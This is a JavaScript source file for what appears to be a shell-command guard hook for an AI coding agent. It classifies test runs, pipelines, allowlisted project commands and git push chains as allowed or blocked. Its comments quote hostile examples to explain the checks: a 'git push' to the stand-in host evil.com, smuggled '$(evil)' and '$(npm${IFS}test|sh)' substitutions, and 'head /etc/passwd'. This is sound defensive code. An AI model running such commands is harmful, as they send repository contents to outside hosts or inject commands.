function isBoundedNodeTestCheck(segment) {
  const tokens = segment.trim().split(RX28).filter(Boolean);
  if (tokens.length < 3 || tokens.length > 4) return false;
  if (basename(tokens[0]).toLowerCase() !== 'node') return false;
  if (tokens[1] !== '--test') return false;
  const files = tokens.slice(2);
  for (const f of files) {
    if (f.startsWith('-')) return false;
    if (RX61.test(f)) return false;
    if (f.endsWith('/')) return false;
    if (!RX62.test(f)) return false;
  }
  return true;
}

// `[npx] vitest run <1-2 explicit test files>` / `[npx] jest <1-2 explicit
// test files>` — the JS-runner twin of isBoundedNodeTestCheck: no flags, no
// globs, no directories, each target an explicit `*.test|spec.<js|ts…>` file.
// Full suites, watch mode, `--coverage` and any other flag stay heavy.
function isBoundedJsTestRunnerCheck(segment, ctx) {
  const tokens = segment.trim().split(RX28).filter(Boolean);
  let i = 0;
  if (tokens[i] === 'npx') i++;
  if (tokens[i] === 'vitest') { i++; if (tokens[i] !== 'run') return false; i++; }
  else if (tokens[i] === 'jest') i++;
  else return false;
  const files = tokens.slice(i);
  if (files.length < 1 || files.length > 2) return false;
  if (ctx && ctx.cwdUnknown) return false; // a preceding cd we could not resolve
  const payload = ctx && ctx.payload;
  const base = (payload && typeof payload.cwd === 'string' && payload.cwd) || process.cwd();
  // Each operand must be an EXISTING regular file whose basename is
  // `<stem>.test|spec.<ext>` - a bare `.test.ts` is a runner FILTER PATTERN
  // (matches many files), not a file.
  return files.every((f) => {
    if (f.startsWith('-') || RX63.test(f)) return false;
    if (!RX64.test(basename(f))) return false;
    try { return fs.statSync(path.resolve(base, f)).isFile(); } catch (_) { return false; }
  });
}

function isCtestNameCheck(segment) {
  return RX65.test(segment.trim());
}

// isScratchpadOrTmpPath(p, ctx) -> true when p (relative paths resolve
// against the payload cwd) lands strictly inside THIS session's own
// scratchpad (lib/scratchpad.js ownScratchpadDirs — computed from the
// payload's cwd + session_id + the process uid, never a name match) or a
// tmp root (tmpRoots: os.tmpdir(), /tmp, /private/tmp — the same set
// edit-guard uses; a hook child may not inherit TMPDIR). Both sides are realpath'd (nearest existing ancestor) BEFORE
// the containment test, so `…/scratchpad/../../etc/x` and a symlinked
// component pointing outside are both rejected — the old raw
// `/scratchpad/` substring test accepted any path merely containing it.
function isScratchpadOrTmpPath(p, ctx) {
  if (typeof p !== 'string' || !p) return false;
  const unquoted = p.replace(/^['"]|['"]$/g, '');
  if (!unquoted || RX66.test(unquoted)) return false; // expansion/glob: unknowable target
  if (ctx && ctx.cwdUnknown && !path.isAbsolute(unquoted)) return false; // unresolved preceding `cd`
  const payload = ctx && ctx.payload;
  const base = (payload && typeof payload.cwd === 'string' && payload.cwd) || process.cwd();
  let abs;
  try { abs = path.resolve(base, unquoted); } catch (_) { return false; }
  const sp = require('./lib/scratchpad.js');
  // ctx.ownOnly: THIS session's scratchpad only, not the generic tmp roots.
  const roots = sp.ownScratchpadDirs(payload).concat(ctx && ctx.ownOnly ? [] : sp.tmpRoots());
  for (const root of roots) {
    if (sp.isInsideDir(abs, root)) return true;
  }
  return false;
}

// `git clone --depth 1 <https-url> <dest>` with dest inside this session's
// scratchpad or a tmp root — the only clone shape that qualifies. The
// local-path clone form is gone: a local "source" can be any path on disk
// (or an `ext::`/transport-ish token git interprets), so it never qualifies.
function isSafeScratchpadGitClone(segment, ctx) {
  const m = segment.trim().match(RX67);
  if (!m) return false;
  return isScratchpadOrTmpPath(m[2], ctx);
}

function isQualifyingSingleTargetCheck(segment, ctx) {
  if (isSyntaxOnlyCompileCheck(segment)) return true;
  if (isSinglePytestFileCheck(segment)) return true;
  if (isBoundedNodeTestCheck(segment)) return true;
  if (isBoundedJsTestRunnerCheck(segment, ctx)) return true;
  if (isCtestNameCheck(segment)) return true;
  if (isSafeScratchpadGitClone(segment, ctx)) return true;
  if (isGenericCheckFlagCommand(segment)) return true;
  if (isInterpreterScriptCheck(segment, ctx)) return true;
  return false;
}

// isLooseSinkShape(segment) -> true iff the stage NAMES a sink-like command
// (tail/head/wc, or grep with -c / -m N somewhere). Shape only: it says nothing
// about operands or flags, so it never decides an allow by itself.
function isLooseSinkShape(segment) {
  const verb = effectiveVerb(segment);
  if (!verb) return false;
  if (verb === 'tail' || verb === 'head' || verb === 'wc') return true;
  if (verb === 'grep') {
    return RX68.test(segment) || RX69.test(segment);
  }
  return false;
}

// isBoundedSinkSegment(segment) -> true iff the stage is a sink-shaped command
// that ALSO satisfies the closed grammar (isClosedSinkStage): stdin-only, no
// file operand, no unknown flag. `head /etc/passwd` / `tail -n +1 --pid=1` are
// NOT sinks. `2>&1` only merges stderr into the pipe, so it is judged without it.
function isBoundedSinkSegment(segment) {
  if (!isLooseSinkShape(segment)) return false;
  // A leading `command ` (bypass an alias, e.g. a grep wrapper) is the one wrapper kept.
  return isClosedSinkStage(segment.replace(/(^|\s)2>&1(?=\s|$)/g, ' ').trim().replace(RX70, ''));
}

// isScratchFileSinkSegment(segment, ctx) -> true iff the stage is a closed sink
// whose only file operands are scratchpad/tmp paths (isScratchpadOrTmpPath). Used
// ONLY by the background scratch-script chain, whose documented remedy shape is
// `script > out; wc -l out; grep -c PAT out`: the sink reads the script's own
// output file, never an arbitrary path.
function isScratchFileSinkSegment(segment, ctx) {
  if (!isLooseSinkShape(segment)) return false;
  if (hasUnquotedRedirectChar(segment) || hasShellExpansionAnywhere(segment)) return false;
  const t = tokenizeQuoted(segment.trim().replace(RX70, ''));
  let end = t.length;
  // grep: exactly one trailing file operand (the token before it is the
  // pattern, never a path); wc/head/tail: any number of trailing operands.
  const maxStrip = t[0] === 'grep' ? 1 : t.length;
  for (let n = 0; n < maxStrip && end > 1 && !t[end - 1].startsWith('-') && isScratchpadOrTmpPath(t[end - 1], ctx); n++) end--;
  return closedSinkTokens(t.slice(0, end));
}

// Read-only FILTER stages that may sit between a qualifying check and its
// bounded sink (`vitest run f 2>&1 | grep -E "Tests|FAIL" | head -5`): the
// pipeline is bounded by its LAST stage, and these only transform stdin to
// stdout. Anything that can write a file or run a program (tee, xargs, sh,
// `sed -i`/`w`/`e`, `sort -o`, awk with system()/getline/redirects/pipes)
// is NOT a filter and keeps the pipeline blocked.
function isReadOnlyFilterSegment(segment) {
  const verb = effectiveVerb(segment);
  if (!verb) return false;
  const raw = segment.trim();
  // ANY unquoted output redirect (`>`, `>>`, `>|`, `&>`, `n>`, `>&n`) makes the
  // stage a writer, whatever the target (even a tmp/scratchpad path). Only the
  // stderr->pipe merge `2>&1` is harmless.
  if (RX71.test(neutralizeQuotedContents(raw).replace(/(^|\s)2>&1(?=\s|$)/g, ' '))) return false;
  const tokens = tokenizeQuoted(raw);
  const args = tokens.slice(1);
  if (verb === 'grep') return true;
  if (verb === 'cut' || verb === 'tr') return true;
  if (verb === 'sort') return !args.some((t) => RX72.test(t));
  if (verb === 'uniq') return args.every((t) => t.startsWith('-')); // a positional is an OUTPUT file
  if (verb === 'sed') {
    if (!args.includes('-n')) return false;
    const rest = args.filter((t) => t !== '-n');
    return rest.length === 1 && RX73.test(rest[0]);
  }
  if (verb === 'awk') {
    if (args.some((t) => RX74.test(t))) return false;
    return !RX75.test(raw);
  }
  return false;
}

// A segment that is NOT heavy by itself and does not open a subshell, a loop
// or a substitution (those stay on their existing paths) may ride in a chain
// of otherwise-allowed segments.
function isPlainLightSegment(segment, command) {
  const seg = segment.trim();
  if (RX76.test(seg)) return false;
  if (RX77.test(neutralizeQuotedContents(seg))) return false;
  if (RX78.test(seg) || RX79.test(seg)) return false;
  if (RX80.test(seg)) return false;
  // Full classifier (shell -c / eval / wrapper / substitution unwrapping), so a
  // shell-wrapped heavy command cannot ride a chain; light inner stays light.
  try { return !isHeavyCommand(seg); } catch (_) { return false; }
}

function isTriviallySafeSegment(segment) {
  const verb = effectiveVerb(segment);
  return !!verb && T.verifyTrivial.has(verb);
}

// Any write redirect (`>`, `>>`) or `tee` target that resolves outside the
// scratchpad/tmp disqualifies the whole command, `&>file`/`&>>file` included.
// `2>&1`/`>&2` fd-dup targets (no real path) are ignored.
function hasDisallowedWriteRedirect(segment, ctx) {
  const re = /(^|[^<>&])(&?>>?)\s*(\S+)/g;
  let m;
  while ((m = re.exec(segment))) {
    const target = m[3];
    if (RX81.test(target)) continue;
    if (!isScratchpadOrTmpPath(target, ctx)) return true;
  }
  const verb = effectiveVerb(segment);
  if (verb === 'tee') {
    const tokens = segment.trim().split(RX28).filter(Boolean);
    for (let i = 1; i < tokens.length; i++) {
      const t = tokens[i];
      if (t.startsWith('-')) continue;
      return !isScratchpadOrTmpPath(t, ctx);
    }
  }
  return false;
}

// isBoundedVerificationCommand(command) -> bool. See the header block above
// for the full rule. No command-substitution/`bash -c`/`eval` unwrapping is
// performed here on purpose — this exception is scoped to a literal, visible
// command line only; anything obfuscated through those never qualifies.
function isBoundedVerificationCommand(command, ctx) {
  if (typeof command !== 'string' || !command.trim()) return false;
  // An unquoted `#` starts a shell comment, which can hide the sink the
  // splitter thinks it saw (`x --check #| tail -5` runs unbounded). Refuse it.
  if (RX82.test(neutralizeQuotedContents(command))) return false;
  const { segments, delims } = splitSegmentsDetailed(command);
  if (!segments.length) return false;

  // Every PIPELINE (segments joined by `|`) that runs a qualifying check must
  // END in a bounded sink — `x --check && x --check | tail` leaves the first
  // check unbounded. A pipeline may only end at `;`, `&&`, `||`, a newline or
  // the end of the line; `&` (background) or any other delimiter disqualifies.
  const PIPELINE_ENDS = new Set([';', '&&', '||', '\n', 'end']);
  let sawQualifying = false;
  let pipelineHasCheck = false;
  for (let idx = 0; idx < segments.length; idx++) {
    const seg = segments[idx].trim();
    if (!seg) continue;
    // A `cd <path>` segment moves where every LATER relative path (script,
    // interpreter, clone dest) resolves — track it so `cd <repo> && <check>
    // | tail` is judged against the directory it actually runs in. A cd we
    // cannot resolve statically marks the cwd unknown (relative paths refuse).
    if (effectiveVerb(seg) === 'cd') {
      const cdTok = tokenizeQuoted(seg);
      const cdBase = (ctx.payload && typeof ctx.payload.cwd === 'string' && ctx.payload.cwd) || process.cwd();
      // Honoured ONLY as an unconditional step: every earlier delimiter and this
      // one are `&&`, so the cd ran (and succeeded) before anything after it. A cd
      // after `||`, in a pipe (subshell), or joined by `;` (may have failed, or be
      // a subshell) leaves the cwd unknown. The target is realpath'd: the shell's
      // physical cwd is what relative script paths resolve against.
      let cdCwd = null;
      if (cdTok.length === 2 && cdTok[0] === 'cd' && !RX83.test(cdTok[1]) &&
          delims[idx] === '&&' && delims.slice(0, idx).every((x) => x === '&&')) {
        try { cdCwd = fs.realpathSync(path.resolve(cdBase, cdTok[1])); } catch (_) { cdCwd = null; }
      }
      if (cdCwd) {
        ctx = Object.assign({}, ctx, { payload: Object.assign({}, ctx.payload, { cwd: cdCwd }) });
      } else {
        ctx = Object.assign({}, ctx, { cwdUnknown: true });
      }
    }
    if (hasDisallowedWriteRedirect(seg, ctx)) return false;
    let kind;
    // `2>&1` only merges stderr INTO the pipe (still bounded by the sink), so
    // the check shape is judged without it. Any other `>&` fd-dup (`>&2`,
    // `1>&2`) routes output AROUND the sink, so that segment never qualifies.
    const checkSeg = seg.replace(/(^|\s)2>&1(?=\s|$)/g, ' ').trim();
    if (!RX84.test(neutralizeQuotedContents(checkSeg)) && isQualifyingSingleTargetCheck(checkSeg, ctx)) {
      kind = 'check';
      sawQualifying = true;
      pipelineHasCheck = true;
    } else if (isLooseSinkShape(seg)) {
      // A sink-shaped stage that breaks the closed grammar (file operand,
      // unknown flag) bounds nothing and is never a light segment either.
      if (!isBoundedSinkSegment(seg)) return false;
      const precedingDelim = idx > 0 ? delims[idx - 1] : null;
      if (precedingDelim !== '|') return false; // sequential (;/&&), not piped: not bounded
      kind = 'sink';
    } else if (isTriviallySafeSegment(seg)) {
      kind = 'trivial';
    } else if (idx > 0 && delims[idx - 1] === '|' && isReadOnlyFilterSegment(seg)) {
      // A read-only filter fed by a pipe: bounded only if the pipeline still
      // ends in a sink (enforced below: an unbounded tail stage returns false).
      kind = 'filter';
    } else if (!(idx > 0 && delims[idx - 1] === '|') && isPlainLightSegment(seg, command)) {
      // A non-heavy segment that starts its own pipeline/step (e.g. `git
      // check-ignore ...`, `echo X`) rides along: the chain is allowed iff
      // EVERY segment is individually allowed.
      kind = 'light';
    } else {
      return false;
    }
    const d = delims[idx];
    if (d === '|') continue;
    if (!PIPELINE_ENDS.has(d)) return false;
    if (pipelineHasCheck && kind !== 'sink') return false; // this pipeline's output is unbounded
    pipelineHasCheck = false;
  }
  return sawQualifying;
}

// ---------------------------------------------------------------------------
// Per-project command allowlist (owner-approved 2026-09-26). Lets a PROJECT
// declare its own sanctioned exact commands (e.g. its deploy script) that run
// inline in the MAIN THREAD ONLY, even though they classify heavy above — a
// project's own rule may require its deploy to never be delegated to a
// subagent (a subagent once reshaped one). The project opts in itself, by
// committing `<repo-toplevel>/.anti-hall/command-allow.json` — anti-hall
// ships with nothing allowed anywhere (default empty list == no behavior
// change for a repo that never created this file). Gated by
// guards.projectCommandAllow (default true); NEVER applied outside
// isCoordinator(payload) — see the call site in main().
//
// Reuses splitSegmentsDetailed — no new parser (a recurring bug class here is
// a second/third hand-rolled segment splitter).
// ---------------------------------------------------------------------------

// loadProjectCommandAllowPatterns(cwd) -> the VALID patterns of this repo's
// allowlist, and only when the user TRUSTED that exact file content
// (lib/command-allow.js: ~/.anti-hall/trusted-command-allow.json maps the
// repo realpath to the sha256 of the file bytes; any edit -> untrusted until
// `node scripts/settings.js trust-command-allow --confirmed` re-trusts it).
// A pattern is valid per validatePattern: literal `^` + a literal command
// word, closing `$`, no unbounded wildcard such as `.*`/`.+`, no top-level
// `|` — `^.*$` is NOT an anchored rule, it allows everything. Symlinked,
// missing, malformed or untrusted config -> [] (no behavior change);
// doctor.js reports each case.
function loadProjectCommandAllowPatterns(cwd) {
  const lib = require('./lib/command-allow.js');
  return lib.loadTrustedPatterns(cwd, io.homeOf(guardEnv));
}

// hasUnquotedRedirectChar(segment) -> true if a bare (unquoted) '>' or '<'
// appears anywhere — the per-project allowlist bans ANY redirect regardless
// of destination (unlike the narrow-allow carve-out above, which only cares
// about the destination path), since the whole point is running the
// project's declared command EXACTLY, never a redirected variant of it.
function hasUnquotedRedirectChar(segment) {
  let inSingle = false;
  let inDouble = false;
  for (let i = 0; i < segment.length; i++) {
    const c = segment[i];
    const c2 = i + 1 < segment.length ? segment[i + 1] : '';
    if (inSingle) { if (c === "'") inSingle = false; continue; }
    if (inDouble) {
      if (c === '\\' && c2) { i++; continue; }
      if (c === '"') inDouble = false;
      continue;
    }
    if (c === '\\' && c2) { i++; continue; } // outside quotes: escaped char is literal
    if (c === "'") { inSingle = true; continue; }
    if (c === '"') { inDouble = true; continue; }
    if (c === '>' || c === '<') return true;
  }
  return false;
}

// isSingleUnbrokenSegment(command) -> the command splits into exactly ONE
// logical segment via splitSegmentsDetailed, terminated by 'end' (i.e. no
// ';'/'&&'/'||'/'|'/'&'/newline/heredoc/subshell-or-group/command-substitution
// boundary was found outside quotes anywhere in the line) — this is what
// rules out chaining, pipes, subshells, backticks and `$( )` in one check,
// reusing the guard's own canonical splitter rather than a second parser.
function isSingleUnbrokenSegment(command) {
  const { segments, delims } = splitSegmentsDetailed(command);
  if (segments.length !== 1) return false;
  return delims[0] === 'end';
}

// matchedProjectCommandAllowPattern(command, cwd) -> the matching pattern
// string, or null. ALL of these must hold:
//   1. the config resolves at least one valid, TRUSTED pattern for this repo;
//   2. the WHOLE command is exactly one segment (no chaining/pipes/subshells/
//      command substitution — see isSingleUnbrokenSegment);
//   3. no unquoted redirect character anywhere in the command;
//   4. no `$`, backtick, backslash or `<(`/`>(` anywhere, quoted or not
//      (hasShellExpansionAnywhere) — the shell would rewrite the text the
//      pattern matched;
//   5. the WHOLE (trimmed) command line matches one whole pattern exactly.
function matchedProjectCommandAllowPattern(command, cwd) {
  return cmdMemo('allow:' + cwd + '\0' + command, function () { return matchedProjectCommandAllowPatternRaw(command, cwd); });
}
function matchedProjectCommandAllowPatternRaw(command, cwd) {
  if (typeof command !== 'string' || !command.trim()) return null;
  const patterns = loadProjectCommandAllowPatterns(cwd);
  if (!patterns.length) return null;
  if (!isSingleUnbrokenSegment(command)) return null;
  if (hasUnquotedRedirectChar(command)) return null;
  if (hasShellExpansionAnywhere(command)) return null;
  const trimmed = command.trim();
  for (const p of patterns) {
    let re;
    try { re = new RegExp(p); } catch (_) { continue; }
    if (re.test(trimmed)) return p;
  }
  return null;
}

// redactAuditCommand(command) -> the command with secret-looking values
// masked before it is logged: a value after a secret-named flag
// (`--token X`, `--password=X`, `-p` is NOT matched — too generic), then
// jev-assist's scrubSecrets (key=/token= assignments, known key prefixes,
// Bearer/JWT/PEM/URL credentials, long base64/hex runs).
function redactAuditCommand(command) {
  let s = String(command || '');
  s = s.replace(/(^|\s)(--?[A-Za-z0-9_-]*(?:token|password|passwd|secret|apikey|auth|credential|key)[A-Za-z0-9_-]*)(\s+|=)(\S+)/gi, '$1$2$3[REDACTED]');
  try {
    s = require('./lib/jev-assist.js').scrubSecrets(s);
  } catch (_) {
    // scrubber unavailable: the flag masking above still applied.
  }
  return s;
}

// appendProjectCommandAllowAudit({cwd, repo, pattern, command}) -> best-effort,
// ONE ndjson line per allowed run, to ~/.anti-hall/logs/command-allow.ndjson.
// Uses the canonical resolveHome() helper (see test-home-guard.js and
// tests/hygiene/homedir-call-site-ratchet.test.js) so a test with an isolated
// HOME never touches the real developer machine. The ~/.anti-hall and logs
// dirs must not be symlinks (lstat) and the file is opened O_NOFOLLOW, so a
// planted symlink can never redirect the write; the logged command is
// redacted (redactAuditCommand). Fully fail-open: a write failure never
// blocks or un-allows the command that already passed.
function appendProjectCommandAllowAudit(entry) {
  try {
    const home = io.homeOf();
    const ahDir = ah.cfg('command.audit_state_dir');
    const logRel = ahDir + '/' + ah.cfg('command.audit_logs_dir');
    if (!ah.state.op(home, 'mkdir', logRel)) return;
    for (const d of [path.join(home, ahDir), path.join(home, logRel)]) {
      const st = fs.lstatSync(d);
      if (st.isSymbolicLink() || !st.isDirectory()) return;
    }
    const line = JSON.stringify({
      ts: new Date(ah.clock.now()).toISOString(),
      cwd: entry.cwd || '',
      repo: entry.repo || '',
      pattern: entry.pattern || '',
      command: redactAuditCommand(entry.command || ''),
    }) + '\n';
    ah.state.op(home, 'append', logRel + '/' + ah.cfg('command.audit_file'), line);
  } catch (e) {
    if (cmdFatal(e)) throw e;
  }
}


// ---------------------------------------------------------------------------
// "Allow plain push" carve-out (owner-approved 2026-09-26, widened
// 2026-09-26 on a field repro). Lets the MAIN THREAD run `git add …`, `git
// commit …`, and a plain `git push [remote] [ref]` — plus `&&`/`;` chains
// made up ONLY of those three — inline, even though a `git push` segment is
// classified heavy above (T.heavyPatterns). git-guard.js keeps its own
// independent force-push and AI-credit checks; this carve-out never touches
// or duplicates those.
//
// A push segment qualifies ONLY as the bare shape `git push [-q|--quiet|-u|
// --set-upstream] [remote] [ref]` (`-u` needs an explicit remote AND ref) — no other flags, no `+refspec`, no `src:dst` (a `:` or
// leading `+`/`-` token — other than the one recognized `-q`/`--quiet` slot
// — disqualifies the whole chain, which then falls through to the ordinary
// heavy-command block, i.e. no behavior CHANGE for --force/--mirror/
// --delete/-d/--all/--tags/a foreign dst — they are exactly as blocked as
// before, including `-q` combined with any of them: the quiet slot is
// exactly one token, in exactly that position). A given `remote` must be a
// configured remote NAME (`git -C <cwd> remote`; a path or URL-ish token
// never qualifies, unresolvable fails closed). A given `ref` must be `HEAD`
// or the CURRENT branch (`git -C <cwd> symbolic-ref --short HEAD`) — a push
// to any other branch never qualifies; the resolver failing (detached HEAD,
// not a repo, spawn error) fails CLOSED (does not qualify).
//
// Widened shapes (field repro: `cd <repo> && git add a b && git commit -q -m
// "fix: x" && git push -q origin main && git log --oneline -1` was blocked
// as heavy-pattern — none of the three gaps below existed yet):
//   (a) `-q`/`--quiet` on push (add/commit already accepted any flags via a
//       prefix match, so they needed no change).
//   (b) ONE optional LEADING `cd <path>` segment — allowed only when
//       `path.resolve(payload cwd, path)` REALPATHs to the payload cwd's own
//       repo toplevel, or a directory inside it (never a different repo, a
//       symlink escape, or an unresolvable path — fails CLOSED). All branch/
//       remote resolution for the rest of the chain then uses that resolved
//       directory, not the payload cwd.
//   (c) Optional TRAILING read-only segments, and ONLY after at least one
//       push segment has already appeared in the chain: `git log --oneline
//       [-N]`, `git status [--short|-s]`, `git show --stat [-N|HEAD]`. No
//       other git subcommand, no flags outside this exact shape.
//   (d) Field repro (peer sweep, 0.115.2): `git push origin
//       HEAD:refs/heads/<branch> 2>&1 | tail -2` was blocked by three
//       separate checks. Now accepted, still only for the CURRENT branch:
//       a `SRC:DST` ref whose SRC is `HEAD`/the current branch and whose DST
//       is the current branch (optionally `refs/heads/`-qualified) - the same
//       destination as the approved bare form; a trailing `2>&1` on any chain
//       segment; and ONE final `| tail [-n] N` / `| head [-n] N` output filter.
//       A foreign DST, a delete (`:dst`), `+` force and every flag stay
//       exactly as blocked as before.
//   (e) ONE final `> <file>` / `>> <file>` redirect (optionally with `2>&1`)
//       whose target is inside THIS session's own scratchpad (a bounded sink,
//       the same as `| tail`; the output goes to a file, not the main thread).
//       NOT the generic tmp roots, a `$`/glob/`~` target, or any other redirect
//       form — those keep blocking.
// ---------------------------------------------------------------------------

// A bare remote/ref token: no leading '-' or '+' (rules out every flag and
// force-refspec form), and no ':' anywhere (rules out `src:dst`/delete
// refspecs) — enforced by the character class simply never including ':'.
// The one optional flag slot right after `push` matches ONLY `-q`/`--quiet`/
// `-u`/`--set-upstream` verbatim (not a character class), so `--force`/`-f`/anything else there
// still fails the whole regex, same as before this carve-out was widened.
const PLAIN_PUSH_SEGMENT_RE = /^git\s+push(?:\s+(-q|--quiet|-u|--set-upstream))?(?:\s+((?![-+])[A-Za-z0-9_.\/-]+))?(?:\s+((?![-+])[A-Za-z0-9_.\/-]+(?::[A-Za-z0-9_.\/-]+)?))?\s*$/;
// (d) The one accepted trailing output filter, piped from the last segment.
const PLAIN_OUTPUT_FILTER_RE = /^(?:tail|head)(?:\s+(?:-n\s*)?-?\d+)?\s*$/;
// (d) A trailing `2>&1` (stderr merged into stdout) - no other redirect.
const TRAILING_STDERR_MERGE_RE = /\s+2>&1\s*$/;

// Trailing read-only segments (c) — only ever consulted AFTER a push segment
// has already appeared in the chain (enforced in isAllowedPlainPushChain,
// not here). Each is an exact, narrow shape: no other flags, no redirects
// (redirect/substitution characters are already rejected by
// classifyPlainGitChainSegment before these run).
const PLAIN_LOG_SEGMENT_RE = /^git\s+log\s+--oneline(?:\s+-\d+)?\s*$/;
const PLAIN_STATUS_SEGMENT_RE = /^git\s+status(?:\s+(?:--short|-s))?\s*$/;
const PLAIN_SHOW_SEGMENT_RE = /^git\s+show\s+--stat(?:\s+(?:-\d+|HEAD))?\s*$/;
// Post-push verification reads: `git ls-remote [--heads] <remote> [<ref>]` and
// `git rev-parse [--short] <HEAD|ref>`. Bare tokens only (no flag other than
// the one listed, no `:`/`+`); the ls-remote remote must be a configured name.
const PLAIN_LSREMOTE_SEGMENT_RE = /^git\s+ls-remote(?:\s+--heads)?\s+((?![-+])[A-Za-z0-9_.\/-]+)(?:\s+(?![-+])[A-Za-z0-9_.\/-]+)?\s*$/;
const PLAIN_REVPARSE_SEGMENT_RE = /^git\s+rev-parse(?:\s+--short)?\s+(?![-+])[A-Za-z0-9_.\/-]+\s*$/;

// hasSubstitutionOutsideSingleQuotes(segment) -> true if a `` ` `` or `$(`
// appears anywhere the shell would actually EXPAND it — i.e. outside single
// quotes (double quotes still expand command substitution; only single
// quotes make it literal). This is what keeps `git commit -m "$(evil)"` out
// of the allow-chain even though it is still a single, unbroken `git commit`
// segment by the plain chain-delimiter check alone.
function hasSubstitutionOutsideSingleQuotes(segment) {
  let inSingle = false;
  let inDouble = false;
  for (let i = 0; i < segment.length; i++) {
    const c = segment[i];
    const c2 = i + 1 < segment.length ? segment[i + 1] : '';
    if (inSingle) { if (c === "'") inSingle = false; continue; }
    if (inDouble) {
      if (c === '\\' && c2) { i++; continue; }
      if (c === '"') { inDouble = false; continue; }
      if (c === '`') return true;
      if (c === '$' && c2 === '(') return true;
      continue;
    }
    if (c === '\\' && c2) { i++; continue; } // outside quotes: escaped char is literal
    if (c === "'") { inSingle = true; continue; }
    if (c === '"') { inDouble = true; continue; }
    if (c === '`') return true;
    if (c === '$' && c2 === '(') return true;
  }
  return false;
}

// hasShellExpansionAnywhere(command) -> true if the command carries ANY
// expansion/escape character, quoted or not: `$` (covers $( ), ${ }, $VAR,
// $IFS), a backtick, a backslash, or a process substitution `<(`/`>(`. The
// per-project allowlist matches command TEXT against a regex, so anything the
// shell would rewrite before running it (inside double quotes too —
// `"$(npm${IFS}test|sh)"` satisfied `\S+`) must never reach the match.
// Extends hasSubstitutionOutsideSingleQuotes' coverage to every quote context.
function hasShellExpansionAnywhere(command) {
  if (hasSubstitutionOutsideSingleQuotes(command)) return true;
  return RX85.test(command);
}

// classifyPlainGitChainSegment(segment) -> {kind:'add'|'commit'} |
// {kind:'push', remote, ref} | {kind:'log'|'status'|'show'} | null.
// `remote`/`ref` are the (post-quiet-flag) first/second bare tokens of a
// plain push (null when omitted).
function classifyPlainGitChainSegment(segment) {
  const trimmed = segment.trim().replace(TRAILING_STDERR_MERGE_RE, '');
  if (hasUnquotedRedirectChar(trimmed)) return null;
  if (hasSubstitutionOutsideSingleQuotes(trimmed)) return null;
  if (RX86.test(trimmed)) return { kind: 'add' };
  if (RX87.test(trimmed)) return { kind: 'commit' };
  const m = trimmed.match(PLAIN_PUSH_SEGMENT_RE);
  if (m) {
    // A1-6: with NO explicit remote token, git parses the sole positional
    // argument as the <repository> (remote), not a refspec — real git syntax
    // is `git push [<repository> [<refspec>...]]`, so a lone `SRC:DST`-shaped
    // token is only ever a refspec when an explicit remote token precedes it.
    // A colon-bearing token with no remote group is a scp-like remote URL
    // (`host:path`) to git, however ref-shaped it looks (e.g. a branch named
    // to look like a host: `git push evil.com:refs/heads/evil.com` passes
    // isPlainPushRefAllowed's SRC===DST===<current branch> check while git
    // itself pushes over ssh to host `evil.com`). Reject the segment outright
    // rather than let isPlainPushRefAllowed's ref-shaped check vouch for it.
    if (m[3] && m[3].indexOf(':') !== -1 && !m[2]) return null;
    // `-u`/`--set-upstream` is the ONLY upstream flag accepted, and only with
    // BOTH an explicit remote and an explicit ref (`git push -u origin
    // <branch>`) - a bare `git push -u`/`-u origin` never qualifies. Remote/ref
    // are then vetted exactly like the plain form. It shares the single flag
    // slot, so `-q -u`/`-u -q`/`-uf` never match the regex.
    if ((m[1] === '-u' || m[1] === '--set-upstream') && !(m[2] && m[3])) return null;
    return { kind: 'push', remote: m[2] || null, ref: m[3] || null };
  }
  if (PLAIN_LOG_SEGMENT_RE.test(trimmed)) return { kind: 'log' };
  if (PLAIN_STATUS_SEGMENT_RE.test(trimmed)) return { kind: 'status' };
  if (PLAIN_SHOW_SEGMENT_RE.test(trimmed)) return { kind: 'show' };
  const lr = trimmed.match(PLAIN_LSREMOTE_SEGMENT_RE);
  if (lr) return { kind: 'lsremote', remote: lr[1] };
  if (PLAIN_REVPARSE_SEGMENT_RE.test(trimmed)) return { kind: 'revparse' };
  return null;
}

// classifyLeadingCdSegment(segment) -> the raw path argument string, or null
// if this segment is not a bare, single-argument `cd <path>` (no flags, no
// `-`/`~` shortcuts, no quoting tricks beyond a single simple token — the
// realpath/toplevel check below is the actual security boundary, this just
// rules out anything that is not obviously one plain path argument).
function classifyLeadingCdSegment(segment) {
  const trimmed = segment.trim();
  if (hasUnquotedRedirectChar(trimmed)) return null;
  if (hasSubstitutionOutsideSingleQuotes(trimmed)) return null;
  if (hasShellExpansionAnywhere(trimmed)) return null;
  const tokens = tokenizeQuoted(trimmed);
  if (tokens.length !== 2 || tokens[0] !== 'cd') return null;
  const p = tokens[1];
  if (!p || p === '-' || p.startsWith('~')) return null;
  return p;
}

// gitCommonDirRealpath(dir) -> realpath of the actual, physical .git STORE
// (never the worktree checkout path) for `dir`, via the canonical identity
// resolver (companion/lib/identity.js resolveContext — the ONE "where am I"
// resolver; see tests/hygiene/identity-single-resolver.test.js). Two
// directories share this iff they are the SAME repository: the main
// worktree and every one of its `git worktree add` linked worktrees all
// resolve to the identical common dir, while a git SUBMODULE or any
// independently-`git init`'d nested repo — even though it lives physically
// inside the outer repo's directory tree — has its OWN, different common
// dir. This is the actual repo-IDENTITY check (a path containment check is
// not one). Null (fails closed) on any resolution failure.
function gitCommonDirRealpath(dir) {
  try {
    const info = require('../companion/lib/identity.js').rawGitInfo(dir);
    return info && info.commonDir ? info.commonDir : null;
  } catch (_) {
    return null;
  }
}

// resolvedLeadingCdTarget(rawPath, payloadCwd) -> realpath of the target
// directory, or null (fails CLOSED) unless it is a git repository sharing
// the SAME git-common-dir as the payload cwd's own repo.
//
// SECURITY FIX (field repro, 2026-09-26): the original check only verified
// the target was a path INSIDE the payload cwd's toplevel directory tree —
// `cd realsub && git add z && git commit -m x && git push origin subbr`
// qualified for the carve-out whenever `realsub` merely lived under the
// outer repo's directory, even when `realsub` was a git SUBMODULE or any
// other nested repo with its OWN .git/remote/branch: branch/remote
// resolution then ran against the WRONG repository entirely, validating the
// push against a repo/branch/remote the operator never confirmed. Path
// containment is not repo identity; git-common-dir equality is (worktrees of
// one repo share it, a submodule/nested repo never does — see
// gitCommonDirRealpath's header). Fails CLOSED on any resolution error, an
// unresolvable target, or a target whose own toplevel cannot be resolved.
function resolvedLeadingCdTarget(rawPath, payloadCwd) {
  try {
    const cwd = payloadCwd || process.cwd();
    const target = fs.realpathSync(path.resolve(cwd, rawPath));
    const payloadCommonDir = gitCommonDirRealpath(cwd);
    if (!payloadCommonDir) return null;
